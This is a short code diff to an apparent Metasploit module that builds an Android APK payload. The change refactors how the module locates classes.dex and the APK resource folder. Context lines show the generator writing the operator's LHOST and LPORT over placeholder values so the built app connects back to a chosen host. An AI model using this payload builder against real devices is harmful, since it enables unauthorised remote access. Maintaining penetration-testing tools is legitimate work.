@@ -36,8 +36,11 @@ module Metasploit3
 
   def generate_jar(opts={})
     jar = Rex::Zip::Jar.new
+    pathname = Metasploit::Framework.root.join('data', 'android', 'apk', 'classes.dex')
 
-    classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})
+    classes = pathname.open('rb') { |f|
+      f.read(f.stat.size)
+    }
 
     string_sub(classes, '127.0.0.1                       ', datastore['LHOST'].to_s) if datastore['LHOST']
     string_sub(classes, '4444                            ', datastore['LPORT'].to_s) if datastore['LPORT']
@@ -50,7 +53,7 @@ module Metasploit3
       [ "resources.arsc" ]
     ]
 
-    jar.add_files(files, File.join(Msf::Config.install_root, "data", "android", "apk"))
+    jar.add_files(files, Metasploit::Framework.root.join("data", "android", "apk").to_path)
     jar.build_manifest
 
     x509_name = OpenSSL::X509::Name.parse(
